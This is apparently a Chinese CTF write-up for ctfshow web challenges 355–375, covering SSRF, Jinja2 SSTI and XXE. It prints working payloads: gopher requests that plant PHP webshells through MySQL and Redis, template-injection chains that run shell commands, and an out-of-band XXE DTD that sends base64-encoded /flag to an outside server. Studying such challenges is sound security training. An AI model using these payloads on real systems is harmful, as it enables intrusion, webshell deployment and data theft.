   die('hacker');
}
}
else{
   die('hacker');
}
?>
```

该题目利用一些域名解析后可以访问本地从而读取flag。

```php
sudo.cc    
safe.taobao.com
spoofed.burpcollaborator.net
www.ruiaxx.cn
```

这些都可以解析为0.0.0.0或者127.0.0.1

直接`http://`加上上面这些就行了

## 355

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
   die('hacker');
}
}
else{
   die('hacker');
}
?> 
```

`parse_url`会将url拆分成不同的部分

| `scheme` | `http` | 协议（http/https/ftp 等） |
| :--- | :--- | :--- |
| `host` | `127.0.0.1` | 主机名（域名 / IP） |
| `port` | `8080` | 端口（默认 http:80、https:443） |
| `path` | `/flag.php` | 路径 |
| `query` | `id=1` | 查询参数 |

url=http://127.1/flag.php\
url=http://0/flag.php

在Linux中0代表本地

## 356

限制长度为3，同上

## 357

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
   die('ip!');
}
echo file_get_contents($_POST['url']);
}
else{
   die('scheme');
}
?>
```

gethostbyname是返回主机的IP地址

filter\_var — 使用特定的过滤器过滤一个变量

FILTER\_VALIDATE\_IP - 验证是否为有效的IP地址

FILTER\_FLAG\_NO\_PRIV\_RANGE - 排除私有IP地址

FILTER\_FLAG\_NO\_RES\_RANGE 排除保留IP地址 如回环地址127.0.0.1

要求是公网的地址

方法一：

过DNS重绑定的方法去绕过检测。\
https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s\_pctim\_aiomsg

方法二：

在自己的服务器上创建文件重新返回本地ip

```php
<?php
    header("Location:http://127.0.0.1/flag.php", true, 302);
?>
```

搭建完这个直接传入就行了

## 358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

正则绕过要求满足：http:// 后开头是 ctf.  结尾是 show

payload:

<http://ctf.@127.0.0.1/flag.php> #show

原因：

```
parse_url()函数在读取url时会读取@字符后的地址，加#号是注释掉show，不会影响到前面的内容。

也可以用 ? [http://ctf.@127.0.0.1/flag.php?show](http://ctf.@127.0.0.1/flag.php?show)，问号在url中也是隔断符，不会影响前面的内容。
```

还是事，可以自己编辑服务器做

## 359

题目给了提示，是打无密码的mysql

使用Gopherus工具

Gopherus 是一款 CTF 场景中常用的 Gopher 协议 Payload 生成工具，核心用于利用 SSRF（服务器端请求伪造）漏洞，通过构造恶意 Gopher 协议请求，攻击内网中的中间件（如 MySQL、Redis、FastCGI 等），最终实现命令执行、数据泄露等攻击效果。

Gopher 是一种早期的互联网协议（比 HTTP 更简洁），默认端口 70，支持双向数据传输。其核心特点是：可以将任意二进制数据封装成 Gopher 请求发送，且很多服务（如 MySQL、Redis）支持通过 Gopher 协议接收命令。

使用方法直接python打开就行了

`gopherus --exploit mysql`针对mysql进行操作

填入用户名`root`

填入需要使用的语句`select '<?php @eval($_POST[1]);?>' into outfile '/var/www/html/guan.php';`

下面是生成的rce

```php
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%67%75%61%6e%2e%70%68%70%27%3b%01%00%00%00%01
```

这里的SSRF漏洞是由于curl\_exec()函数引起的，因此需要给后面的url再次进行编码，不然传过去会将%进行解码。

```php
gopher://127.0.0.1:3306/_%25%61%33%25%30%30%25%30%30%25%30%31%25%38%35%25%61%36%25%66%66%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31%25%32%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%37%32%25%36%66%25%36%66%25%37%34%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%35%66%25%36%65%25%36%31%25%37%34%25%36%39%25%37%36%25%36%35%25%35%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%30%30%25%36%36%25%30%33%25%35%66%25%36%66%25%37%33%25%30%35%25%34%63%25%36%39%25%36%65%25%37%35%25%37%38%25%30%63%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%38%25%36%63%25%36%39%25%36%32%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%34%25%35%66%25%37%30%25%36%39%25%36%34%25%30%35%25%33%32%25%33%37%25%33%32%25%33%35%25%33%35%25%30%66%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%30%36%25%33%35%25%32%65%25%33%37%25%32%65%25%33%32%25%33%32%25%30%39%25%35%66%25%37%30%25%36%63%25%36%31%25%37%34%25%36%36%25%36%66%25%37%32%25%36%64%25%30%36%25%37%38%25%33%38%25%33%36%25%35%66%25%33%36%25%33%34%25%30%63%25%37%30%25%37%32%25%36%66%25%36%37%25%37%32%25%36%31%25%36%64%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%35%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%34%61%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%37%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%33%31%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%32%37%25%32%30%25%36%39%25%36%65%25%37%34%25%36%66%25%32%30%25%36%66%25%37%35%25%37%34%25%36%36%25%36%39%25%36%63%25%36%35%25%32%30%25%32%37%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%37%25%37%35%25%36%31%25%36%65%25%32%65%25%37%30%25%36%38%25%37%30%25%32%37%25%33%62%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31
```

然后在check.php中可以找到注入点参数returl

![1764070098945-d184afa7-3d22-4397-ad1e-1d2c71adaaa5.png](./img/CnfOBJ-v8acdaBX2/1764070098945-d184afa7-3d22-4397-ad1e-1d2c71adaaa5-425126.png)

这个returl参数输入的是一个url，所以直接猜测是注入点，然后用Gopher协议直接注入

通过BP注入进去然后蚁剑连接就行了。

## 360

哇，好眼熟

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

第一题的指令试一下，发现找不到flag.php这个文件

看一下提示，是打redis

那么直接使用就行了，他会问你是打什么，你输入打php的shell

后面默认的命令和路径不需要考虑

<font style="color:rgb(77, 77, 77);">生成默认木马：</font><font style="color:rgb(78, 161, 219) !important;">shell</font><font style="color:rgb(77, 77, 77);">.php 密码是cmd</font>

```php
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

转换一下url

```php
gopher://127.0.0.1:6379/_%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%30%41%66%6c%75%73%68%61%6c%6c%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%25%30%44%25%30%41%31%25%30%44%25%30%41%25%32%34%33%34%25%30%44%25%30%41%25%30%41%25%30%41%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%34%5f%47%45%54%25%35%42%25%32%37%63%6d%64%25%32%37%25%35%44%25%32%39%25%33%42%25%32%30%25%33%46%25%33%45%25%30%41%25%30%41%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%31%33%25%30%44%25%30%41%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%39%25%30%44%25%30%41%73%68%65%6c%6c%2e%70%68%70%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%73%61%76%65%25%30%44%25%30%41%25%30%41
```

但是输入进去有乱码，不是很行的样子

所以还是改一下shell，改成`<?php eval(system("tac f*"));?>`就行了

# SSTI

运行<code><u>fenjing webui</u></code>

需要将输入的语句进行两个大括号框起来才能动态解析

先找到传参点是name

现在框架下的网站都是通过类搭建所有的网页，其中的元素基本都是类

所以可以通过类找到上层的基类然后调用基类的某个子类进行注入

## 361

通过`"".__class__`找到现在使用的这个类是什么

`"".__class__.__bases__[0]`获取基类列表

`"".__class__.__bases__[0].__subclasses__()`获取这个基类下面的所有子类

我们要使用的是`os.popen`这个类下的这个函数，作用是执行系统命令。

![1764074037099-618ebf23-0378-420e-a3da-4bdc0511b549.png](./img/CnfOBJ-v8acdaBX2/1764074037099-618ebf23-0378-420e-a3da-4bdc0511b549-574524.png)

接下来就是在这一坨类中间找到os这个类

发现是一个叫做`os._wrap_close`的类

是第133个类，所以调用\[132]

`"".__class__.__bases__[0].__subclasses__()[132]`调用os这个类

"`".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__`访问这个类初始化时候的所有的初始变量

"`.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']`找到初始化时候的`popen`变量

`"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag')`直接把这个`popen`当作参数执行命令就行了

但是问题是命令执行后返回的是执行命令的通道，就是说返回的是两者进行沟通的道路而非沟通的内容，所以需要`read()`函数进行读取

```php
"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()
```

![1764074378659-20129ed0-5a4c-4ad1-b31b-31d6f29e9d82.png](./img/CnfOBJ-v8acdaBX2/1764074378659-20129ed0-5a4c-4ad1-b31b-31d6f29e9d82-891472.png)

获取payload

## 362

其实和上一道题目差不多，就是过滤了`3`和`2`两个字符、

按照全角数字输入就行了

## 363

和上一道题目相比又禁用了""，索性不加了

传参会自动过滤双引号，所以直接不加了就行了

用x代替就行了

```php
?name=&#123;&#123;x.__init__.__globals__[request.args.a].eval(request.args.b)&#125;&#125;&a=__builtins__&b=__import__('os').popen('cat /flag').read()
```

## 364

过滤了arg，但是其实和我使用的payload没有什么关系

可以使用cookie的方式直接写进去

```php
?name=&#123;&#123;x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)&#125;&#125;
```

```php
x1=__builtins__;x2=__import__('os').popen('cat /flag').read()
```

## 365

和上一道题目相比又过滤了`" ' [ arg`这几个东西

所以`__base__[0]`是不能用了

`__getitem__(0)`等价于`[0]`

所以直接用`__getitem__`将所有的`[]`都替换就行了

至于shell的代码不能用"",直接cookie传参就行了

```php
&#123;&#123;x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a)&#125;&#125;
a tac /flag
```

`request.values.a`：从请求参数（GET/POST 均可）中获取键为 `a` 的值（比如你传 `a=whoami`，就等价于执行 `whoami` 命令）；

`shell=True`：控制是否通过系统 shell 解析命令；

`stdout=-1`：控制命令输出的捕获方式；

## 366

不能使用下划线了，难受

但是还有attr过滤器，相当于使用了attr后面包括的内容，即

attr("**base**") 的作用相当于\_\_base\_\_

所以用attr将所有的变量都转换到cookie中就行了

但是没有成功，不知道为什么，难受。

可以利用其他的语句

<code>?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&a =cat /flag</code>这里含有下划线的部分就是`lipsum.__globals__`这一部分

`(lipsum | attr(request.values.b))`

这里的`|`将`lipsum`（模块对象）传给`attr`过滤器，等价于执行：`attr(lipsum, request.values.b)`

结合`b=__globals__`，最终效果是：`attr(lipsum, '__globals__')` → 即获取`lipsum`模块的全局变量字典（等同于`lipsum.__globals__`）。

通过利用get请求将含有下划线的通过b传入就可以绕过过滤，再通过attr的方式返回一个属性而不返回项目

```php
?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&a=cat /flag&b=__globals__
```

<code><font style="color:rgba(0, 0, 0, 0.85);">lipsum</font></code><font style="color:rgba(0, 0, 0, 0.85);">是一个 Python 模块（第三方库），每个模块在加载时会创建一个</font>**全局命名空间字典**<font style="color:rgba(0, 0, 0, 0.85);">（即</font><code><font style="color:rgba(0, 0, 0, 0.85);">模块名.__globals__</font></code><font style="color:rgba(0, 0, 0, 0.85);">），这个字典中存储了模块内定义 / 导入的所有变量、函数、类和模块引用。</font>

所以这里直接.os就可以直接找到os的数据

<code><font style="color:rgba(0, 0, 0, 0.85);">|</font></code><font style="color:rgba(0, 0, 0, 0.85);">是</font>**过滤器（Filter）的分隔符**<font style="color:rgba(0, 0, 0, 0.85);">，作用是将左侧的变量 / 对象传递给右侧的过滤器函数进行处理，本质是 “管道操作”—— 把左边的结果作为右边过滤器的输入，返回处理后的新值。</font>

## 367

过滤了`os`

但是感觉其实只要不过滤`request`就不需要担心，可以从`request`中获取

```php
?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&a=__globals__&b=os&c=cat /flag
```

我应该早点发现的，cookie方法被禁用了，所以一直拿不出数据来

## 368

这一次过滤了请求了request，但是只限于再&#123;&#123;&#125;&#125;这个里面，就很神奇，使用&#123;%%&#125;就能绕过

上一道题目的payload直接把{}换成&#123;%%&#125;就行了

## 369

过滤了requests

```php
?name=
&#123;% set po=dict(po=a,p=a)|join%&#125;
&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;
&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;
&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;
&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;
&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;
&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;
&#123;% set chr=x.chr%&#125;
&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;
&#123;%print(x.open(file).read())%&#125;
```

#### <font style="color:rgb(0, 0, 0);">1.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set po=dict(po=a,p=a)|join%&#125;`

* `dict(po=a,p=a)`：创建字典`{'po': a, 'p': a}`（此时`a`尚未定义，值为`None`）。
* `|join`：将字典的键拼接成字符串 → `'pop'`（字典`join`会拼接键，而非值）。
* 最终`po = 'pop'`（后续用于调用`list.pop()`方法）。

#### <font style="color:rgb(0, 0, 0);">2.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;`

这一步是**获取字符**<code>**'_'**</code>，拆解：

* `()`：空元组。
* `|select`：调用 Jinja2 的`select`过滤器，返回一个迭代器对象（`<generator object select_or_reject at 0x...>`）。
* `|string`：将迭代器对象转为字符串，格式类似`'<generator object select_or_reject at 0x7fxxxx>'`。
* `|list`：将字符串转为字符列表（每个字符为列表元素）。
* `|attr(po)(24)`：`attr(po)`即`attr('pop')`，调用列表的`pop(24)`方法（取列表第 24 个元素并删除）。
  * 迭代器字符串的第 24 个字符通常是`'_'`（下划线），因此`a = '_'`。

#### <font style="color:rgb(0, 0, 0);">3.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;`

* `a='_'`，`dict(init=a)|join`拼接字典键得`'init'`。
* 拼接结果：`'_' + '_' + 'init' + '_' + '_'` → `ini = '__init__'`（Python 对象的初始化方法名）。

#### <font style="color:rgb(0, 0, 0);">4.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;`

* `dict(globals=a)|join`拼接键得`'globals'`。
* 拼接结果：`'__globals__'`（模块 / 函数的全局命名空间属性）。

#### <font style="color:rgb(0, 0, 0);">5.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;`

* `dict(getitem=a)|join`拼接键得`'getitem'`。
* 拼接结果：`'__getitem__'`（Python 的索引访问魔法方法，等价于`[]`）。

#### <font style="color:rgb(0, 0, 0);">6.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;`

* `dict(builtins=a)|join`拼接键得`'builtins'`。
* 拼接结果：`'__builtins__'`（Python 的内置模块，包含`open`、`eval`等函数）。

#### <font style="color:rgb(0, 0, 0);">7.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;`

这一步是**获取**<code>**__builtins__**</code>**模块**，拆解：

* `q`：模板上下文的任意对象（假设是某个函数 / 类实例，比如`request`或默认的环境对象）。
* `|attr(ini)`：`attr('__init__')` → 获取对象的`__init__`方法（构造函数）。
* `|attr(glo)`：`attr('__globals__')` → 获取`__init__`方法的全局命名空间字典。
* `|attr(geti)`：`attr('__getitem__')` → 获取字典的`__getitem__`方法（即`[]`）。
* `(built)`：调用`__getitem__('__builtins__')` → 从全局字典中取出`__builtins__`模块。
* 最终`x = __builtins__`（Python 内置对象集合）。

#### <font style="color:rgb(0, 0, 0);">8.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set chr=x.chr%&#125;`

* `x.chr`即`__builtins__.chr` → 获取`chr()`函数（将 ASCII 码转为字符）。

#### <font style="color:rgb(0, 0, 0);">9.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;`

* `chr(47)` → `'/'`，`chr(102)`→`'f'`，`chr(108)`→`'l'`，`chr(97)`→`'a'`，`chr(103)`→`'g'`。
* `%2b`是 URL 编码的`+`（拼接字符串），最终`file = '/flag'`。

#### <font style="color:rgb(0, 0, 0);">10.</font><font style="color:rgb(0, 0, 0);"> </font>`&#123;%print(x.open(file).read())%&#125;`

* `x.open`即`__builtins__.open` → 打开文件`/flag`。
* `.read()`读取文件内容并通过`print`输出 → 最终获取`/flag`的内容。

# XXE

## 373

```php
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 13:36:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
 
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);    
```

*<font style="color:#DF2A3F;">libxml\_disable\_entity\_loader(false);:</font>*

默认情况下，libxml\_disable\_entity\_loader 是启用的，它禁用外部实体的加载。这里，它被设置为 false，意味着允许外部实体的加载。这可能带来安全风险，因为它可能允许 XXE (XML External Entity) 攻击。

读取输入:

$xmlfile = file\_get\_contents('php://input');

这行代码从 PHP 的输入流（通常是 POST 请求的主体）中读取内容，并将其存储在 $xmlfile 变量中。

处理 XML:

`if(isset($xmlfile))`: 确保 $xmlfile 变量已经设置。

`$dom = new DOMDocument();`: 创建一个新的 DOMDocument 对象。

`$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);`: 使用 `DOMDocument` 的 `loadXML` 方法来加载 XML 数据。`LIBXML_NOENT` 和 `LIBXML_DTDLOAD` 是加载选项，其中 `LIBXML_NOENT` 会将实体替换为它们的值，而 `LIBXML_DTDLOAD` 会加载外部 `DTD`。

`$creds = simplexml_import_dom($dom);`: 使用 `simplexml_import_dom` 函数将 `DOMDocument` 对象转换为 `SimpleXMLElement` 对象，这使得处理 XML 数据更加简单。

`$ctfshow = $creds->ctfshow;`: 从 `SimpleXMLElement` 对象中提取名为 "ctfshow" 的元素。

echo $ctfshow;: 输出 "ctfshow" 元素的值。

构建一个payload就能直接输入

```php
<?xml version="1.0" encoding="UTF-8"?> 
<!--以上为xml文本的基本格式-->
​
<!--定义hacker变量-->
<!--外部实体的说明使用SYSTEM关键字，并且必须指定应在其中加载的实体值的URL，注入实体，值为根目录下flag文件内容 -->
<!DOCTYPE hacker[
    <!ENTITY hacker SYSTEM "file:///flag.php">
]>
<root>
<!-- PHP中$ctfshow = $creds->ctfshow; -->
    <ctfshow>
<!-- 读取hacker变量 --> 
        &hacker;
    </ctfshow>
</root>
```

`<!DOCTYPE test [...]>`：定义 XML 的文档类型（DOCTYPE），名称为`test`，内部包含实体声明。

`<!ENTITY it SYSTEM "file:///flag">`：声明一个**外部实体（external entity）**：

* `it`是实体名称；
* `SYSTEM`表示这是外部实体，需要从指定的 URI 加载内容；
* `file:///flag`是本地文件 URI，意图读取服务器上根目录下的`flag`文件（常见的 CTF 场景中目标文件）。
* `<!DOCTYPE test [...]>`：定义 XML 的文档类型（DOCTYPE），名称为`test`，内部包含实体声明。

`<!ENTITY it SYSTEM "file:///flag">`：声明一个**外部实体（external entity）**：

* `it`是实体名称；
* `SYSTEM`表示这是外部实体，需要从指定的 URI 加载内容；
* `file:///flag`是本地文件 URI，意图读取服务器上根目录下的`flag`文件（常见的 CTF 场景中目标文件）。

这个文件中因为是外部的文件，SYSTEM指定了输出的类型，所以可以直接输出，而XML解释器解析了伪协议， 所以直接输出就是文件

然后直接BP抓包，更改一下传参方式就行，注意不要以键值对的形式传参

## 374

```php
<?php

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

没有回显的xxe注入，需要外带到自己的服务器

我的天哪，调了快3个小时，终于调出来了，中间错了一大堆

自己建一个服务器，我是另外设置了一个端口，为的就是不要和80重复

然后建一个服务器，开一个php，我开的是index.php

```php
<?php 
file_put_contents("test.txt", $_GET['file']) ; 
?>
```

然后新建一个xxe.dtd，内容如下

```php
<!ENTITY % dtd "<!ENTITY &#x25; xxe  SYSTEM 'http://43.129.27.97:206/index.php?file=%file;'> ">
%dtd;
%xxe;
```

之后在抓包发送payload

```php
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://43.129.27.97:206/xxe.dtd">
%aaa;
]>
<root>123</root>
```

之后payload就能出来，但是我并不知道之前为什么不成功

注意一下dtd文件

<font style="color:rgba(0, 0, 0, 0.85);">利用 XML 实体的解析规则实现数据传输</font>

#### <font style="color:rgb(0, 0, 0);">1. 第一行：定义参数实体</font>`%dtd`

```xml
<!ENTITY % dtd "<!ENTITY &#x25; xxe  SYSTEM 'http://43.129.27.97:206/index.php?file=%file;'> ">
```

* `<!ENTITY % dtd ...>`：定义一个**参数实体**（以`%`开头），名称为`dtd`；
* 实体内容是一段嵌套的实体声明：`<!ENTITY &#x25; xxe SYSTEM 'http://xxx/index.php?file=%file;'>`；
* `&#x25;`是 XML 对`%`的实体编码（DTD 中直接写`%`会被解析器识别为参数实体开头，需转义），因此`&#x25; xxe`实际等价于`%xxe`；
* `SYSTEM 'http://xxx/index.php?file=%file;'`：指定`%xxe`实体指向的外部资源 —— 向`index.php`发送 GET 请求，参数`file`的值为`%file`（即后续要替换的目标文件内容）。

#### <font style="color:rgb(0, 0, 0);">2. 第二行：调用参数实体</font>`%dtd`

```xml
%dtd;
```

* 执行这行时，XML 解析器会将`%dtd`替换为其定义的内容（即`<![ENTITY %xxe SYSTEM 'http://xxx/index.php?file=%file;'>`）；
* 效果：动态创建了另一个参数实体`%xxe`。

#### <font style="color:rgb(0, 0, 0);">3. 第三行：调用参数实体</font>`%xxe`

```xml
%xxe;
```

* 执行这行时，解析器会加载`%xxe`指向的外部资源（即发送 HTTP 请求到`http://xxx/index.php?file=%file;`）；
* 若`%file`已在外部 Payload 中定义（如`<![ENTITY %file SYSTEM 'php://filter/read=convert.base64-encode/resource=/flag'>`），则`%file`会被替换为 Base64 编码的`/flag`内容，最终请求变为`http://xxx/index.php?file=Base64编码的flag`。

#### <font style="color:rgb(0, 0, 0);">1. Payload 第一部分：定义本地参数实体</font>`%file`

**xml**

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
```

* 作用：在本地 XML 中声明一个**参数实体**`%file`，指向目标服务器的`/flag`文件；
* 通过`php://filter`伪协议读取`/flag`并 Base64 编码（避免特殊字符破坏 URL 结构）；
* 此时`%file`的值就是`/flag`文件内容的 Base64 编码字符串（如`YmFzZTY05oiR5piv...`）。

#### <font style="color:rgb(0, 0, 0);">2. Payload 第二部分：加载远程 DTD 并执行</font>

**xml**

```xml
<!ENTITY % aaa SYSTEM "http://43.129.27.97:206/xxe.dtd">
%aaa;
```

* `<!ENTITY % aaa ...>`：声明参数实体`%aaa`，指向你 VPS 上的远程 DTD 文件；
* `%aaa;`：触发加载并执行远程`xxe.dtd`的内容 —— 这是连接本地`%file`和远程外带逻辑的关键桥梁。

#### <font style="color:rgb(0, 0, 0);">3. 远程</font>`xxe.dtd`<font style="color:rgb(0, 0, 0);">的嵌套逻辑（联动本地</font>`%file`<font style="color:rgb(0, 0, 0);">）</font>

当`%aaa;`执行时，解析器会加载你的`xxe.dtd`内容：

**xml**

```xml
<!ENTITY % dtd "<!ENTITY &#x25; xxe SYSTEM 'http://43.129.27.97:206/index.php?file=%file;'> ">
%dtd;
%xxe;
```

* **第一步**：`%dtd;`将`%dtd`替换为其内容，动态生成`%xxe`实体 —— 此时`%xxe`的指向是：`http://43.129.27.97:206/index.php?file=本地%file的Base64内容`；
* **第二步**：`%xxe;`触发 HTTP 请求 —— 目标服务器会向你的 VPS 发送包含`/flag`Base64 内容的 GET 请求。

其中嵌套的意义就是在定义的时候直接将file拼接到里面，然后重新定义使用。

## 375

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-07 12:59:52
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-07 15:22:05
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"/', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
